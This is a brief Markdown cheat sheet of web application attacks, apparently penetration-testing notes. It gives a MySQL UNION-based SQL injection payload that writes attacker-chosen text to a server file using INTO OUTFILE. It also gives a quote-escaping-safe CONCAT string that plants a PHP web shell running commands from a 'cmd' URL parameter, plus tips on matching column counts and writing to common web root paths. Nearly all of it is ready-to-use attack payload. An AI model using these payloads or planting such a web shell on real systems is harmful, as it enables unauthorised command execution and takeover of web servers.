# Web Application Attacks

## Table of Contents
* [SQL Injection](#sql-injection)


## SQL Injection

### MySQL UNION SQL Injection to save [TEXT] into [FILE] on target system
```
UNION ALL SELECT '[TEXT]' INTO OUTFILE '[FILE]'#
```
When saving a PHP web shell to a file via the above SQL Injection, use the following value for [TEXT] (to avoid character-escaping on single-quote characters):
```
CONCAT('<?php echo shell_exec($_GET[',0x27,'cmd',0x27,']); ?>')
```

### Tips on saving files via UNION
- As with any UNION injection, the number of columns in the UNION needs to match the number of columns in the query being modified
- An uploaded file should almost always be written to the web server root (this can often be obtained from verbose web app error messages).
  - Windows: C:\inetpub\wwwroot\
  - Linux:
    - /var/www
    - /var/www/html

